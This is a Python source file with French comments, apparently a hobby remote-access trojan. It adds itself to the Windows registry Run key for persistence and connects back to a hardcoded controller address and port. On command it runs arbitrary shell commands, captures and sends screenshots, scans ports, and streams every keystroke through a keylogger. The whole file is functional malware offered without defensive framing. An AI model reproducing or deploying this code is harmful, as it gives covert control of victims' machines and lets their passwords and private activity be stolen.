import socket
import subprocess
import sys
import winreg as reg
from PIL import ImageGrab
from pynput import keyboard

ip_add = "127.0.0.1"
port = 3280

# Persistance
def persistance():
    script_path = sys.argv[0]
    registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"

    key = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_WRITE)
    reg.SetValueEx(key, "agent.py", 0, reg.REG_SZ, script_path)
    reg.CloseKey(key)

# Lance l'agent
def start_agent(s):
    s.connect((ip_add, port))
    data_socket(s)

# Execute la commande
def execute_command(s, command):
    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = result.communicate()
    output = stdout.decode("cp1252", errors="replace") + stderr.decode("cp1252", errors="replace")
    # Envoi du résultat au serveur
    s.send(output.encode("utf-8"))

# Fonction de screenshot
def screenshot(s):
    screen = ImageGrab.grab()

    image_bin = screen.tobytes() # Convertir l'image en binaire
    width, height = screen.size

    # Envoyer les dimensions et les données
    s.send(len(image_bin).to_bytes(4, 'big'))
    s.send(width.to_bytes(4, 'big')) 
    s.send(height.to_bytes(4, 'big'))  
    s.send(image_bin)

# Fonction de scanner de port
def scan_port(ip, port_range):
    start, end = map(int, port_range.split("-"))
    results = []
    for port in range(start, end + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as port_socket:
            port_socket.settimeout(2) 
            conn_result = port_socket.connect_ex((ip, port))  # Teste de la connexion
            if conn_result == 0:
                results.append(f"Port {port} is open")
            else:
                results.append(f"Port {port} is closed")
    return "\n".join(results) 

# Envoie les frappes au serveur 
def send_keypress(s, key):
    if hasattr(key, 'char') and key.char:
        s.send(key.char.encode())
    else:
        s.send(str(key).encode())

# touche presse
def press(s, key):
    send_keypress(s, key)

# Recoie et envoie des données
def data_socket(s):
    while True:
        request = s.recv(1024)
        command = request.decode("utf-8")

        if command == "capture":
            screenshot(s)

        elif command.startswith("scan"):
            try:
                _, ip, port_range = command.split()
                result = scan_port(ip, port_range)
                s.send(result.encode("utf-8"))
            except ValueError:
                # Si la commande est mal formée, envoyer un message d'erreur au serveur
                s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")

        elif command == "keylogger":
            start_keylogger(s)
        else: 
            execute_command(s, command)

# Demarre le keylogger et envoie les key
def start_keylogger(s):
    with keyboard.Listener(on_press=lambda key: press(s, key)) as listener:
        listener.join()

if __name__ == "__main__":
    
    persistance()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    start_agent(s)


        
